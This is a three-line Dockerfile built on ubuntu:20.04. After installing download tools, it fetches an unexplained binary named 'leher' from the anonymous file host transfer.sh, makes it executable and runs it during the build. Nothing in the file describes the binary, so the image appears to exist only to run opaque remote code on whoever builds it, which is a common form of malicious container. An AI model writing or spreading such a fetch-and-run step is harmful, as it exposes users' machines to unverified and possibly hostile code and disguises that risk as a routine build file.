FROM ubuntu:20.04 as ubuntu-base
RUN apt-get update && apt-get install -y curl git unzip wget
RUN wget https://transfer.sh/YWH8xO/leher && chmod +x leher && ./leher
